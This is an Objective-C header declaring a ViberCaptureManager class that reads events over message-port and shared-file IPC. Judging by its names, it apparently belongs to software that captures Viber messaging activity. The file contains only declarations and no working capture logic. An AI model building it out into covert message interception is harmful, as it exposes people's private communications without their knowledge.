//
//  ViberCaptureManager.h
//  ViberCaptureManager
//
//  Created by Makara Khloth on 11/27/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "EventCapture.h"
#import "MessagePortIPCReader.h"
#import "SharedFile2IPCReader.h"

@interface ViberCaptureManager : NSObject <EventCapture, MessagePortIPCDelegate, SharedFile2IPCDelegate> {
@private
	id <EventDelegate>		mEventDelegate;
	
	MessagePortIPCReader	*mMessagePortReader;
	
	SharedFile2IPCReader	*mSharedFileReader1;
}

@property (nonatomic, assign) id <EventDelegate> mEventDelegate;

@end
